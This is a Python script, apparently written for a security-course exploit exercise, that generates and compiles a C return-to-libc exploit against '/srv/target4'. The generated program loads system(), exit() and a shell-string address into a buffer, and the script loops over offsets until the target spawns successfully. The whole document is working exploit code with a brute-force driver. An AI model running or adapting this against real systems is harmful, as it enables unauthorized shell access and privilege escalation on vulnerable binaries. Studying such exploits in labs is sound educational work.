import subprocess

LIBC_BASE = 0xf7de1000

def try_exploit(system_off, exit_off):
    with open("tmp_sploit4.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

#define TARGET "/srv/target4"

int main(void)
{{
  char *args[3];
  char *env[1];

  char buf[24];

  uint32_t *addr_ptr = (uint32_t *)(buf);
  
  *addr_ptr++ = {LIBC_BASE + system_off};
  *addr_ptr++ = {LIBC_BASE + exit_off}; 
  *addr_ptr++ = {LIBC_BASE + 0x15f294};

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-m32", "-o", "tmp_sploit4", "tmp_sploit4.c"])
    p = subprocess.run(["./tmp_sploit4"], capture_output=True)
    return p.returncode == 0

for system_off in range(0, 0x1000, 4):
    for exit_off in range(0, 0x1000, 4):
        print(f"Trying system offset {hex(system_off)} and exit offset {hex(exit_off)}...")
        if try_exploit(system_off, exit_off):
            print(f"Successful exploit with system offset {hex(system_off)} and exit offset {hex(exit_off)}!")
            exit(0)